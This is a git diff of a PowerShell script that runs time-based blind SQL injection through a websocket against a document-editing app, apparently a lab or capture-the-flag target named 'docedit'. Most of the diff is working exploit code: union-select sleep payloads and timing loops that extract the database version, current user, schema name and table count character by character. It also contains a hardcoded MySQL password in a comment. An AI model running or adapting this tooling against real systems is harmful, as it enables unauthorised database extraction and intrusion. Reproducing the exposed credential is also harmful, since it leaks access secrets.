@@ -1,4 +1,7 @@
+# connect to mysql
+# mysql --host=localhost --user=docedit --password=80c2680bb8b8113d57147c25bd371f2b7cffcfa22a9456d444f97ad6f92b70ce docedit
 Import-Module -Name '.\PoshWebSocketClient'
+#$debug=$true
 $usr_email='test@test.com'
 $usr_name='test'
 $pass='test'
@@ -29,6 +32,7 @@ $SaveDoc = @{
   SocketId = 0
   Message = $save_doc_str
 }
+
 
 Write-Output "Initiating Connection"
 Connect-Websocket -Uri "ws://docedit/socket.io/?EIO=3&transport=websocket&t=NMxgB5J&sid="
@@ -64,66 +68,167 @@ Write-Output "Creating Document  $($result.Status)"
 
 $strlen_sqli = "' union select null,(SELECT IF((select length(({0}))={1}),(select sleep(10)),(select 1))),null,null,null,null,null,null-- "
 $extract_char_sqli = "' union select null,(SELECT IF((select ascii(substring(({0}),{1},1))={2}),(select sleep(10)),(select 1))),null,null,null,null,null,null-- "
-# connect to mysql
-# mysql --host=localhost --user=docedit --password=80c2680bb8b8113d57147c25bd371f2b7cffcfa22a9456d444f97ad6f92b70ce docedit
+$extract_count_sqli = "' union select null,(SELECT IF(({0})={1}),(select sleep(10)),(select 1))),null,null,null,null,null,null-- "
+# add super user
 
-Write-Output "Calculating length of Version string"
-$versionStrlen = 0
-for($i = 1; $i -le 20; ++$i) {
-  $guess = $check_email -f $token, ($strlen_sqli -f "select version()","$i")
-  $guess
-  $stopwatch = [System.Diagnostics.Stopwatch]::new()
-  $stopwatch.Start()
-  (Send-Message -Message $guess -SocketId 0).Msg
-  (Receive-Message -SocketId 0).Msg
-  $stopwatch.Stop()
-  if($stopwatch.Elapsed.Seconds -ge 10) {
-    Write-Output "Strlen: $i"
-    Write-Output "Time Elapsed: $($stopwatch.Elapsed)"
-    $versionStrlen = $i
-    break
+# database name
+# select database
+# number of tables in the database
+# SELECT count(*) AS TOTALNUMBEROFTABLES FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'docedit';
+# number of columns in a table
+# SELECT count(*) AS anyName FROM information_schema.columns WHERE table_name ='yourTableName'
+# Via Timebased Blind
+function Get-StringLength {
+  param (
+    [Parameter(Mandatory=$true)]
+    [scriptblock] $SQLIScriptBlock,
+    [Parameter(Mandatory=$true)]
+    [scriptblock] $TransportScriptBlock,
+    [Parameter(Mandatory=$true)]
+    [string] $Query,
+    [Parameter(Mandatory=$true)]
+    [int] $MaxLength
+  )
+  $len = 0 
+  for($i = 1; $i -le $MaxLength; ++$i) {
+    $guess = Invoke-Command -ScriptBlock $SQLIScriptBlock -ArgumentList $i,$Query
+    Write-Debug $guess
+    $stopwatch = [System.Diagnostics.Stopwatch]::new()
+    $stopwatch.Start()
+    Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0, $debug
+    $stopwatch.Stop()
+    if($stopwatch.Elapsed.Seconds -ge 10) {
+      Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
+      $len = $i
+      break
+    }
+    else { Write-Debug "$($stopwatch.Elapsed)" }
+  }
+  return $len
+}
+
+function Get-Count {
+  param (
+    [Parameter(Mandatory=$true)]
+    [scriptblock] $SQLIScriptBlock,
+    [Parameter(Mandatory=$true)]
+    [scriptblock] $TransportScriptBlock,
+    [Parameter(Mandatory=$true)]
+    [string] $Query,
+    [Parameter(Mandatory=$true)]
+    [int] $MaxLength
+  )
+  $count = 0 
+  for($i = 1; $i -le $MaxLength; ++$i) {
+    $guess = Invoke-Command -ScriptBlock $SQLIScriptBlock -ArgumentList $i,$Query
+    Write-Debug $guess
+    $stopwatch = [System.Diagnostics.Stopwatch]::new()
+    $stopwatch.Start()
+    Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0, $debug
+    $stopwatch.Stop()
+    if($stopwatch.Elapsed.Seconds -ge 10) {
+      Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
+      $count = $i
+      break
+    }
+    else { Write-Debug "$($stopwatch.Elapsed)" }
+  }
+  return $count
+}
+
+function Get-String {
+  param (
+      [Parameter(Mandatory=$true)]
+      [scriptblock] $SQLIScriptBlock,
+      [Parameter(Mandatory=$true)]
+      [scriptblock] $TransportScriptblock,
+      [Parameter(Mandatory=$true)]
+      [string] $Query,
+      [Parameter(Mandatory=$true)]
+      [int[]] $CharacterSet,
+      [Parameter(Mandatory=$true)]
+      [int] $Length
+  )
+  $extracted_string=""
+  for($i = 1; $i -le $Length; ++$i) {
+    for($j = 0; $j -lt $CharacterSet.length; ++$j) {
+      #Write-Output "$($CharacterSets.versionAsciiChars[$j])"
+      #$guess = $check_email -f $token, ($extract_char_sqli -f "select version()","$i","$($CharacterSets.versionAsciiChars[$j])")
+      $guess = Invoke-Command -ScriptBlock $SQLIScriptBlock -ArgumentList $Query, $i, $CharacterSet[$j]
+      Write-Debug $guess
+      $stopwatch = [System.Diagnostics.Stopwatch]::new()
+      $stopwatch.Start()
+      Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0, $debug
+      #(Send-Message -Message $guess -SocketId 0).Msg
+      #(Receive-Message -SocketId 0).Msg | Out-Null
+      $stopwatch.Stop()
+      if($stopwatch.Elapsed.Seconds -ge 10) {
+        $temp = [int]$CharacterSet[$j]
+        Write-Debug $temp 
+        $temp = [char]$temp
+        Write-Debug "Char Found: $temp"
+        Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
+        $extracted_string += $temp
+        break
+      }
+      else {
+      # Write-Output "$($stopwatch.Elapsed)"
+      }
+    }
+  }
+  return $extracted_string
+}
+
+$transport = {
+  param($msg, $SocketId, $debug)
+  if($debug) {
+    (Send-Message -Message $msg -SocketId $SocketId).Msg 
+    (Receive-Message -SocketId $SocketId).Msg
   }
   else {
-    Write-Output "$($stopwatch.Elapsed)"
+    (Send-Message -Message $msg -SocketId $SocketId).Msg | Out-Null
+    (Receive-Message -SocketId $SocketId).Msg | Out-Null
   }
+}
+
+$getLength = {
+  param($len,$Query)
+  $check_email -f $token, ($strlen_sqli -f "$Query","$len")
+}
+$extractString = {
+  param($query, $index, $char) 
+  $check_email -f $token, ($extract_char_sqli -f "$query","$index","$char")
+}
+# getCount
+$getCountTables = {
+  param($len, $Query)
+  $check_email -f $token, ($extract_count_sqli -f "$Query","$len") 
 }
 
 $CharacterSets = @{
-  versionAsciiChars = @('46','48','49','50','51','52','53','54','55','56','57')
+  versionAsciiChars = @(46,48,49,50,51,52,53,54,55,56,57)
   printableChars= 32..127
 }
-$mySQLVersion=""
-for($i = 1; $i -le $versionStrlen; ++$i) {
-  for($j = 0; $j -lt $CharacterSets.versionAsciiChars.length; ++$j) {
-    #Write-Output "$($CharacterSets.versionAsciiChars[$j])"
-    $guess = $check_email -f $token, ($extract_char_sqli -f "select version()","$i","$($CharacterSets.versionAsciiChars[$j])")
-    #$guess
+<#
+$len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select version()" -MaxLength 10
+Write-Output "MySQL version string length: $len"
+$mySQLVersion = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select version()" -Characterset $CharacterSets.printableChars -Length $len
+Write-Output "MySQL version: $mySQLVersion"
 
-    $stopwatch = [System.Diagnostics.Stopwatch]::new()
-    $stopwatch.Start()
-    (Send-Message -Message $guess -SocketId 0).Msg
-    (Receive-Message -SocketId 0).Msg | Out-Null
-    $stopwatch.Stop()
-    if($stopwatch.Elapsed.Seconds -ge 10) {
-      $temp = [int]$CharacterSets.versionAsciiChars[$j]
-      $temp
-      $temp = [char]$temp
-      Write-Output "Char Found: $temp"
-      Write-Output "Time Elapsed: $($stopwatch.Elapsed)"
-      $mySQLVersion += $temp
-      break
-    }
-    else {
-     # Write-Output "$($stopwatch.Elapsed)"
-    }
-  }
-}
+$len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select current_user()" -MaxLength 20
+Write-Output "Current User string length: $len"
+$currentUser = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select current_user()" -Characterset $CharacterSets.printableChars -Length $len
+Write-Output "Current User: $currentUser"
+#>
 
-Write-Output "Mysql version: $mySQLVersion"
+$len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select database()" -MaxLength 10
+Write-Output "Schema string length: $len"
+$schema = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select database()" -Characterset $CharacterSets.printableChars -Length $len
+Write-Output "Schema Nane: $schema"
 
 
-
-#(Receive-Message -SocketId 0).Msg
+$num_tables = Get-Count -SQLIScriptBlock $getCountTables -TransportScriptBlock $transport -Query "select count(table_name) from information_schema.tables where table_schema='docedit'" -MaxLength 10 -Debug
+Write-Output "Number of tables in $schema is $num_tables"
 
 
 Remove-Module PoshWebSocketClient
